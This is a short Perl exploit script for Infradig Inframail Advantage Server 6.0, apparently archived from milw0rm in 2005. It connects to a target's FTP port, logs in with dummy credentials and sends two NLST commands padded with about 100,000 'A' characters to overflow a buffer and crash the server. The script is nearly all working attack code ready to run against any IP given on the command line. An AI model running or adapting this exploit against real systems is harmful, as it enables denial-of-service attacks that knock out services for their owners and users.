#===== Start Inframail_FTPOverflow.pl =====
#
# Usage: Inframail_FTPOverflow.pl <ip>
#        Inframail_FTPOverflow.pl 127.0.0.1
#
# Infradig Systems Inframail Advantage Server Edition 6.0
# (Version: 6.37)
#
# Download:
# http://www.infradig.com/
#
#########################################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => "21",
                                    Proto    => "TCP"))
{
        print "Attempting to kill Inframail FTP server at $ARGV[0]:21...";

        sleep(1);

        print $socket "USER hello\r\n";

        sleep(1);

        print $socket "PASS moto\r\n";

        sleep(1);

        print $socket "NLST " . "A" x 102400 . "\r\n";

        sleep(1);

        print $socket "NLST " . "A" x 102400 . "\r\n";

        close($socket);
}
else
{
        print "Cannot connect to $ARGV[0]:21\n";
}
#===== End Inframail_FTPOverflow.pl =====

# milw0rm.com [2005-06-27]